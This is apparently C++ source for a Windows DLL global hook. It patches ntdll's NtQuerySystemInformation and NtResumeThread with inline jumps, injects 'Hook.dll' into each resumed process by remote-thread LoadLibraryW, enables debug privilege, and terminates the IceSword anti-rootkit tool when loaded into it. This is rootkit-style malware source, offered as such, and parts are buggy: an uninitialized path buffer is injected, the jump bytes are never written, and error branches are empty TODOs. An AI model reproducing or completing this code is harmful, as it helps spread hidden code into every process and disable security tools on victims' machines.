// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include <stdio.h>

HMODULE g_hinstance = NULL;

BOOL g_bHook = FALSE;
typedef LONG NTSTATUS;
#define STATUS_SUCCESS               ((NTSTATUS)0x00000000L)
#define STATUS_ACCESS_DENIED         ((NTSTATUS)0xC0000022L)
#define STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L)
typedef ULONG SYSTEM_INFORMATION_CLASS;
typedef ULONG THREADINFOCLASS;
typedef ULONG PROCESSINFOCLASS;
typedef ULONG KPRIORITY;
#define MEMORY_BASIC_INFORMATION_SIZE 28

typedef struct _CLIENT_ID {
     HANDLE UniqueProcess;
     HANDLE UniqueThread;
} CLIENT_ID;
typedef CLIENT_ID *PCLIENT_ID;

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PNT_TIB TebBaseAddress;
    CLIENT_ID ClientId;
    KAFFINITY AffinityMask;
    KPRIORITY Priority;
    KPRIORITY BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

typedef struct _PROCESS_BASIC_INFORMATION { // Information Class 0
	NTSTATUS ExitStatus;
	PVOID PebBaseAddress;
	KAFFINITY AffinityMask;
	KPRIORITY BasePriority;
	ULONG UniqueProcessId;
	ULONG InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

typedef NTSTATUS (__stdcall *NTQUERYSYSTEMINFORMATION)(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID               SystemInformation,
	IN ULONG                SystemInformationLength,
	OUT PULONG              ReturnLength OPTIONAL 
	);

typedef NTSTATUS (__stdcall *NTRESUMETHREAD)(
	IN HANDLE ThreadHandle,
	OUT PULONG PreviousSuspendCount OPTIONAL
	);

typedef NTSTATUS (__stdcall *NTQUERYINFORMATIONTHREAD)(
	IN HANDLE ThreadHandle,
	IN THREADINFOCLASS ThreadInformationClass,
	OUT PVOID ThreadInformation,
	IN ULONG ThreadInformationLength, 
	OUT PULONG ReturnLength OPTIONAL
	);

typedef NTSTATUS (__stdcall * NTQUERYINFORMATIONPROCESS)(
	IN HANDLE ProcessHandle,
	IN PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength OPTIONAL
	);

NTQUERYSYSTEMINFORMATION g_pfNtQuerySystemInformation = NULL;
NTRESUMETHREAD g_pfNtResumeThread = NULL;
BYTE g_OldNtQuerySystemInformation[5] = {0}, g_NewNtQuerySystemInformation[5] = {0};
BYTE g_OldNtResumeThread[5] = {0}, g_NewNtResumeThread[5] = {0};
DWORD dwIdOld = 0;
CRITICAL_SECTION cs;

NTSTATUS __stdcall NewNtQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
	);

NTSTATUS __stdcall NewNtResumeThread(IN HANDLE ThreadHandle,
OUT PULONG PreviousSuspendCount OPTIONAL);
void WINAPI HookOn();
void WINAPI HookOff();

BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;    
	HANDLE hToken;

	//
	// Try to open this process’s access token
	//
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		//
		// Attempt to modify the "Debug" privilege
		//
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}

#define ThreadBasicInformation 0

void inject(HANDLE hProcess)
{
    WCHAR CurPath[256] = {0};
    GetSystemDirectory(CurPath, 256);
    wcsncat(CurPath, L"\\Hook.dll", 9);
    PWSTR pszLibFileRemote = NULL;
    int len = (wcslen(CurPath)+1)*2;
    WCHAR wCurPath[256];
    
	EnableDebugPrivilege(1);

    pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, len, MEM_COMMIT, PAGE_READWRITE);
    
	WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID) wCurPath, len, NULL);
    
	PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    
	HANDLE hRemoteThread = CreateRemoteThread(hProcess, 
											NULL, 
											0, 
											pfnThreadRtn, 
											pszLibFileRemote, 
											0, 
											NULL);

	WaitForSingleObject(hRemoteThread, INFINITE);
    CloseHandle(hRemoteThread);
    EnableDebugPrivilege(0);
}

NTSTATUS __stdcall NewNtResumeThread(IN HANDLE ThreadHandle,
OUT PULONG PreviousSuspendCount OPTIONAL)
{
    NTSTATUS ret;
    NTSTATUS nStatus;
    NTQUERYSYSTEMINFORMATION NtQuerySystemInformation;
    NTQUERYINFORMATIONTHREAD NtQueryInformationThread = NULL;
    THREAD_BASIC_INFORMATION ti;
    DWORD Pid = 0;

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll, 
                                                             "NtQuerySystemInformation");
    NtQueryInformationThread = (NTQUERYINFORMATIONTHREAD)GetProcAddress(hNtdll, 
                                                             "NtQueryInformationThread");
    if (NULL == NtQueryInformationThread)
    {	
		//TODO
    }

    nStatus = NtQueryInformationThread(ThreadHandle, 
									ThreadBasicInformation, 
									(PVOID)&ti, 
									sizeof(THREAD_BASIC_INFORMATION), 
									NULL);
    if(nStatus != STATUS_SUCCESS)
    {
		//TODO
    }

    Pid = (DWORD)(ti.ClientId.UniqueProcess);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, Pid);
    if (hProcess == NULL)
    {
		//TODO
    }

	BYTE FirstByte[1] = {0};
    ReadProcessMemory(hProcess, NtQuerySystemInformation, FirstByte, 1, NULL); 
    if ( FirstByte[0] == 0xe9)
    {
		HookOff();
		ret = g_pfNtResumeThread(ThreadHandle, PreviousSuspendCount);
		HookOn();
		CloseHandle(hProcess);
		return ret;
    }
    else{
        HookOff();
        inject(hProcess);
        ret = g_pfNtResumeThread(ThreadHandle, PreviousSuspendCount);
        HookOn();
        CloseHandle(hProcess);
        return ret;
    }
}

NTSTATUS __stdcall NewNtQuerySystemInformation(
            IN ULONG SystemInformationClass,
            IN PVOID SystemInformation,
            IN ULONG SystemInformationLength,
            OUT PULONG ReturnLength)
{
    NTSTATUS ntStatus;
    HookOff();
    ntStatus = g_pfNtQuerySystemInformation(SystemInformationClass,
                                                SystemInformation,
                                                SystemInformationLength,
                                                ReturnLength);
    HookOn();
   return ntStatus;
}
void WINAPI HookOn()
{
	PMEMORY_BASIC_INFORMATION lpAllocBuffer = NULL;
	HANDLE hProcess = NULL;
	dwIdOld = GetCurrentProcessId(); 
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwIdOld);
	if(hProcess == NULL){
		return ;
	}

	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	g_pfNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll,"NtQuerySystemInformation");
	if (NULL == g_pfNtQuerySystemInformation)
	{
		return;
	}
	g_pfNtResumeThread = (NTRESUMETHREAD)GetProcAddress(hNtdll, "NtResumeThread");
	if (NULL == g_pfNtResumeThread)
	{
		 return;
	}
	EnterCriticalSection(&cs);
	_asm
	{
		lea edi,g_OldNtQuerySystemInformation
		mov esi,g_pfNtQuerySystemInformation

		cld
		mov ecx,5
		rep movsb
		lea edi,g_OldNtResumeThread
		mov esi,g_pfNtResumeThread
		cld
		mov ecx,5
		rep movsb
	}
	g_NewNtQuerySystemInformation[0] = 0xe9;
	g_NewNtResumeThread[0] = 0xe9;
	_asm
	{
		lea eax, NewNtQuerySystemInformation
		mov ebx, g_pfNtQuerySystemInformation
		sub eax, ebx
		sub eax, 5 
		mov dword ptr [g_NewNtQuerySystemInformation + 1], eax 
		lea eax, NewNtResumeThread
		mov ebx, g_pfNtResumeThread
		sub eax, ebx
		sub eax, 5
		mov dword ptr [g_NewNtResumeThread + 1], eax
	}
	LeaveCriticalSection(&cs);
	g_bHook = TRUE;
}

void WINAPI HookOff()
{
    g_bHook = FALSE;
}

BOOL StartHook ()
{
	OutputDebugString(L"[GlobalHook]: StartHook Entry.\n");

	InitializeCriticalSection(&cs);
	WCHAR Name[MAX_PATH] = {0};
	GetModuleFileName(NULL, Name, MAX_PATH);

	if ( wcsstr(Name, L"IceSword.exe") != NULL)
	{
		HANDLE hProcess = OpenProcess(
									PROCESS_ALL_ACCESS, 							  
									0, 
									GetCurrentProcessId());

		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
	if(!g_bHook)
	{
		HookOn();
	}

	return TRUE;
}

BOOL UnHook ()
{
	OutputDebugString(L"[GlobalHook]: UnHook Entry.\n");

    if(g_bHook)
    {
        HookOff();    
        DeleteCriticalSection(&cs);
    }

	return TRUE;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	g_hinstance = hModule;

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

